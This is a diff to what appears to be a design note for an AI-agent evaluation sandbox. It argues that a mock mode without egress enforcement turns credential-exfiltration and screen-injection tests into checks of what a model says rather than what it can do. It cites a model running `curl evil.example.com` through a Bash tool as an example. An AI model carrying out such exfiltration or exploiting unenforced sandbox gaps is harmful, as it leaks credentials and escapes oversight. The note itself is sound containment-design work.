@@ -135,8 +135,8 @@ system-prompt rules to keep the model from issuing network calls.
 - A model that decides to `curl evil.example.com` via the `Bash` tool simply
   succeeds. The C2 (credential exfil) and C4 (screen injection) falsifiers
   become "did the model *say* it would exfiltrate" rather than "could it."
-  This is exactly the "parlor trick" failure mode flagged in the user's
-  memory (`feedback_robust_over_parlor_tricks.md`).
+  This is exactly the "parlor trick" failure mode: a demo that looks like
+  a containment guarantee but doesn't enforce one.
 - Honesty would require a prominent non-claim in `EXECUTION_MODES.md` saying
   "egress not enforced in mock mode; eval results are model-policy lower
   bounds, not interception upper bounds." That's a degraded sandbox.
